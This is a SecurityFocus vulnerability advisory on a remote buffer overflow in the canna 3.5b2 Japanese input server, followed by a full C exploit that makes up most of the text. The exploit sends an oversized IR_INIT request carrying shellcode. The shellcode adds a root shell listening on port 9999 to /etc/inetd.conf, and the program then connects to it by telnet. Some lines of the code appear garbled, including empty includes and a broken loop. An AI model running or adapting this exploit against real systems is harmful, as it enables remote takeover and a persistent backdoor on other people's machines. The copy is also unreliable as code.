source: http://www.securityfocus.com/bid/1445/info


A vulnerability exists in the 'canna' package, as distributed with a number of free operating systems, and available for other systems. Version 3.5b2 is vulnerable. It is assumed versions prior to this are also vulnerable. By supplying an overly large username or groupname with the IR_INIT command, it is possible to trigger a remote buffer overflow condition.

Successful exploitation will enable a remote attacker to execute arbitrary code as the user the canna server is running as.

This vulnerability affects any system with 3.5b2 installed. FreeBSD has canna as part of its ports collection. FreeBSD itself does not install canna; as such, this vulnerability does not affect stock distributions of FreeBSD. 

/*=============================================================================
   Canna35b2 / cannaserver remote buffer overflow exploit for Linux
   The Shadow Penguin Security (http://shadowpenguin.backsection.net)
   Written by UNYUN (shadowpenguin@backsection.net)
  =============================================================================
*/
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 

#define TARGET_PORT 5680
#define COMMAND     0x01
#define VERSION     "3.3"
#define MAXBUF      300
#define MAXPACKET   1000
#define NOP         0x90
#define RET_OFS     255
#define CODE_OFS    50
#define RET         0x7ffffc70 // default (sh)
//#define       RET    0x7ffff760   // default (csh)
//#define       RET    0x7ffff970   // /usr/sbin/cannaserver
//#define       RET    0x7ffff9c0   // /etc/rc.d/init.d/canna

char *shellcode=
"\xeb\x37\x5e\x31\xc0\x88\x46\x07\x88\x46\x0a\x88\x46\x0d\x88\x46"
"\x62\x89\xf3\x89\x43\x6f\x04\x08\x01\xc6\x89\x73\x63\x83\xc6\x03"
"\x89\x73\x67\x83\xc6\x03\x89\x73\x6b\x8d\x4b\x63\x8d\x53\x6f\xb0"
"\x0b\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xc4\xff\xff\xff\x2f\x62"
"\x69\x6e\x2f\x73\x68\x2e\x73\x68\x2e\x2d\x63\x2e\x65\x63\x68\x6f"
"\x20\x27\x39\x39\x39\x39\x20\x73\x74\x72\x65\x61\x6d\x20\x74\x63"
"\x70\x20\x6e\x6f\x77\x61\x69\x74\x20\x72\x6f\x6f\x74\x20\x2f\x62"
"\x69\x6e\x2f\x73\x68\x20\x73\x68\x20\x2d\x69\x27\x3e\x3e\x2f\x65"
"\x74\x63\x2f\x69\x6e\x65\x74\x64\x2e\x63\x6f\x6e\x66\x3b\x6b\x69"
"\x6c\x6c\x61\x6c\x6c\x20\x2d\x48\x55\x50\x20\x69\x6e\x65\x74\x64"
"\x2e\x30\x30\x30\x30\x31\x31\x31\x31\x32\x32\x32\x32\x4e\x55\x4c"
"\x4c";

main(int argc,char *argv[])
{
    int                 sockfd,i;
    struct in_addr      addr;
    struct sockaddr_in  target;
    struct hostent      *hs;
    char                buf[MAXBUF];
    char                packet[MAXPACKET];

    if (argc<2){
        printf("usage : %s TargetHost\n",argv[0]);
        exit(1);
    }
    sockfd=socket(AF_INET, SOCK_STREAM, 0);
    target.sin_family=AF_INET;
    target.sin_port=htons(TARGET_PORT);
    if ((target.sin_addr.s_addr=inet_addr(argv[1]))==-1){
        if ((hs=gethostbyname(argv[1]))==NULL){
            printf("Can not resolve specified host.\n");
            exit(1);
        }
        target.sin_family = hs->h_addrtype;
        memcpy((caddr_t)&target.sin_addr.s_addr,hs->h_addr,hs->h_length);
    }
    if (connect(sockfd, (struct sockaddr*)&target, sizeof(target))!=0){
        printf("Can not connect to %s:%d\n",argv[1],TARGET_PORT);
        exit(1);
    } 
    memset(buf,NOP,MAXBUF);
    printf("Jumping Address=%x\n",RET);
    buf[300]=0;

    for (i=RET_OFS-32;i>24)&0xff;
        buf[i+2]=(RET>>16)&0xff;
        buf[i+1]=(RET>>8)&0xff;
        buf[i+0]=RET&0xff;
    }
    memcpy(buf+CODE_OFS,shellcode,strlen(shellcode));

    /* Make Packet */
    packet[0]=0x00;
    packet[1]=0x00;
    packet[2]=0x00;
    packet[3]=COMMAND;
    packet[4]=0x00;
    packet[5]=0x00;
    packet[6]=0x00;
    packet[7]=5+strlen(buf);
    sprintf(packet+8,"%s:",VERSION);
    strcpy(packet+12,buf);
    packet[12+strlen(buf)]=0;
    write(sockfd,packet,13+strlen(buf));

    /* Make connection */
    printf("Connected to %d\n",TARGET_PORT);
    sleep(3);
    close(sockfd);
    sprintf(packet,"telnet %s 9999",argv[1]);
    system(packet);
}
